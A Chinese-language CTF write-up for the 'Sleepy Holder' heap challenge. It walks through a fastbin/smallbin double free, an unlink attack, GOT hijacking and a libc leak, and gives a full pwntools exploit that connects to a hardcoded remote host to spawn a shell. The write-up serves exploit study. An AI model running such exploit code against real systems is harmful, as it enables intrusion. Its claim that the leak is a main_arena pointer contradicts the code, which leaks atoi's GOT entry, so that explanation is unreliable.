# 漏洞利用文档：Sleepy Holder

## 执行环境
- 运行环境
  - Ubuntu 16.04
  - libc 2.23
- 缓解措施
  - ASLR: on
  - PIE: off（程序基址固定）
  - NX: on
  - RELRO: Partial RELRO（GOT表可写）
  - Canary: off
  - 其他：程序使用alarm定时器，60秒超时

## 漏洞成因
### 程序关键结构体
程序没有定义复杂结构体，但使用三个全局指针管理堆块：
```c
char *f_ptr;  // 指向small secret（40字节）
char *s_ptr;  // 指向big secret（4000字节）
char *q_ptr;  // 指向huge secret（400000字节）
int f_flag, s_flag, q_flag;  // 对应标志位
```

### 漏洞定位
程序在`del()`函数中释放堆块后未将指针置空，存在Use-After-Free（UAF）漏洞。但更重要的是，通过特定操作序列可以绕过double-free检查，实现同一chunk的重复释放。

关键漏洞代码：
```c
void del() {
    // ...
    case 1:
        free(f_ptr);  // 释放后未置空指针
        f_flag = 0;
        break;
    case 2:
        free(s_ptr);  // 释放后未置空指针
        s_flag = 0;
        break;
}
```

虽然程序通过`f_flag`和`s_flag`限制每个秘密只能释放一次，但利用malloc consolidate机制可以使同一个chunk同时出现在fastbin和smallbin中，从而绕过glibc的double-free检查（fastbin只检查fasttop）。

## 漏洞利用过程
利用思路：通过malloc consolidate将fastbin中的chunk移至smallbin，绕过double-free检查后再次释放同一chunk，构造重叠堆块。然后利用unlink攻击修改全局指针`f_ptr`，进而篡改GOT表，最终执行`system("/bin/sh")`。

- **Step1~3**：堆布局。创建small和big秘密，释放small进入fastbin，再创建huge秘密触发malloc consolidate，将small chunk从fastbin移至smallbin。
- **Step4**：再次释放small。由于small chunk已在smallbin中，fastbin的double-free检查（仅比较fasttop）通过，small chunk被放入fastbin，此时同一chunk同时存在于smallbin和fastbin中。
- **Step5**：重新申请small。从fastbin中取出small chunk，构造伪造的chunk数据，覆盖其在smallbin中的fd和bk指针，指向bss段`f_ptr`附近。
- **Step6**：释放big chunk。由于malloc consolidate后big chunk的`prev_inuse`位被清0，释放时会向前合并，触发small chunk从smallbin中unlink，修改`f_ptr`为`f_ptr-0x18`。
- **Step7~9**：通过update操作修改bss段，将`f_ptr`改为free_got地址，再将free_got覆写为puts_plt，释放big chunk泄露libc地址。
- **Step10~11**：计算system地址，修改free_got为system，最后创建内容为"sh"的big秘密并释放，触发system("sh")。

### 详细步骤分析

#### Step1~3：堆初始化与malloc consolidate
1. 创建small secret（40字节）和big secret（4000字节）。
   - small chunk地址：0x159aa2a0，size=0x31
   - big chunk地址：0x159aa2d0，size=0xfb1
2. 释放small secret，small chunk进入fastbin。
3. 创建huge secret（400000字节），触发malloc consolidate：
   - fastbin中的small chunk被移至smallbin
   - big chunk的`prev_inuse`位被清0，`prev_size`被设置为small chunk大小（0x30）

#### Step4：二次释放small
- 再次执行`de(1)`，由于small chunk不在fastbin中（而在smallbin），fastbin的double-free检查通过，small chunk被再次释放到fastbin。
- 此时small chunk同时存在于smallbin和fastbin中，形成重叠堆块。

#### Step5：构造伪造chunk
- 执行`add(1, fake_chunk)`重新申请small secret，从fastbin中取得small chunk。
- 写入伪造的chunk数据：
  ```python
  fake_chunk = p64(0) + p64(0x21)                    # 伪造chunk头
  fake_chunk += p64(f_ptr - 0x18) + p64(f_ptr - 0x10) # 覆盖smallbin中的fd/bk
  fake_chunk += b'\x20'                               # 填充字节
  ```
- 这段数据覆盖了small chunk用户区的前32字节，恰好是smallbin中存储fd和bk的位置，为后续unlink攻击做准备。

#### Step6：触发unlink
- 执行`de(2)`释放big chunk。
- glibc检查到big chunk的`prev_inuse=0`，根据`prev_size=0x30`找到前一个chunk（即small chunk）。
- 由于small chunk在smallbin中，glibc执行unlink操作：
  ```c
  FD = small->fd = f_ptr - 0x18
  BK = small->bk = f_ptr - 0x10
  FD->bk = BK  // 即 *(f_ptr) = f_ptr - 0x10
  BK->fd = FD  // 即 *(f_ptr) = f_ptr - 0x18
  ```
- 最终`f_ptr`被修改为`f_ptr-0x18`（0x6020b8）。

#### Step7~9：劫持GOT并泄露libc地址
- 此时`f_ptr`指向0x6020b8。通过`update(1, f)`向该地址写入数据：
  ```python
  f = p64(0) + p64(atoi_GOT) + p64(puts_GOT) + p64(free_GOT) + p32(1)*3
  ```
  写入后，`f_ptr`（0x6020d0）被改为free_got地址（0x602018）。
- 使用`update(1, p64(puts_plt))`将free_got改为puts_plt。
- 执行`de(2)`释放big secret，实际调用`puts(s_ptr)`，打印出big chunk中存储的libc地址（unsorted bin中的main_arena指针）。
- 根据泄露的地址计算libc基址和system地址。

#### Step10~11：获取shell
- 用`update(1, p64(system))`将free_got改为system。
- 创建big secret并写入"sh"，释放时触发`system("sh")`。

## Exploit代码
```python
#!/usr/bin/env python
from pwn import *

r = remote('52.68.31.117', 9547)

def add(t, s):
    r.recvuntil('3. Renew secret\n')
    r.sendline('1')
    r.recvuntil('Big secret\n')
    r.sendline(str(t))
    r.recvuntil(': \n')
    r.send(s)

def de(t):
    r.recvuntil('3. Renew secret\n')
    r.sendline('2')
    r.recvuntil('Big secret\n')
    r.sendline(str(t))

def update(t, s):
    r.recvuntil('3. Renew secret\n')
    r.sendline('3')
    r.recvuntil('Big secret\n')
    r.sendline(str(t))
    r.recvuntil(': \n')
    r.send(s)

# Step1-3: 堆布局与malloc consolidate
add(1, 'a')        # small secret
add(2, 'a')        # big secret
de(1)              # free small -> fastbin
add(3, 'a')        # huge secret -> trigger malloc consolidate

# Step4: 二次释放small，绕过double-free检查
de(1)

# Step5: 构造fake chunk，覆盖smallbin中的fd/bk
f_ptr = 0x6020d0
fake_chunk = p64(0) + p64(0x21)
fake_chunk += p64(f_ptr - 0x18) + p64(f_ptr - 0x10)
fake_chunk += b'\x20'
add(1, fake_chunk) # 重新申请small，写入伪造数据

# Step6: 释放big触发unlink，修改f_ptr
de(2)

# Step7-9: 劫持GOT，泄露libc地址
atoi_GOT = 0x602080
free_GOT = 0x602018
puts_GOT = 0x602020
puts_plt = 0x400760
atoi_offset = 0x36e70
system_offset = 0x45380

# 修改bss段，使f_ptr指向free_GOT
f = p64(0) + p64(atoi_GOT) + p64(puts_GOT) + p64(free_GOT) + p32(1)*3
update(1, f)

# 将free_got改为puts_plt，用于泄露地址
update(1, p64(puts_plt))
de(2)  # 实际调用puts(s_ptr)，泄露libc地址
s = r.recv(6)
libc_base = u64(s.ljust(8, b'\x00')) - atoi_offset
system = libc_base + system_offset

# Step10-11: 将free_got改为system，执行system("sh")
update(1, p64(system))
add(2, b'sh\x00')  # 创建内容为"sh"的big secret
de(2)              # 触发system("sh")

r.interactive()
```

**关键点说明**：
1. malloc consolidate是漏洞利用的核心，它打破了“fastbin chunk不会合并”的常规认知，使chunk从fastbin移至smallbin。
2. unlink攻击利用smallbin的链表操作，通过伪造fd/bk实现任意地址写。
3. 通过修改GOT表，将free函数替换为puts，实现信息泄露；再替换为system，最终获取shell。

**注意事项**：
- 实际利用时需根据远程环境调整libc偏移。
- 由于程序使用alarm定时器，需在60秒内完成利用。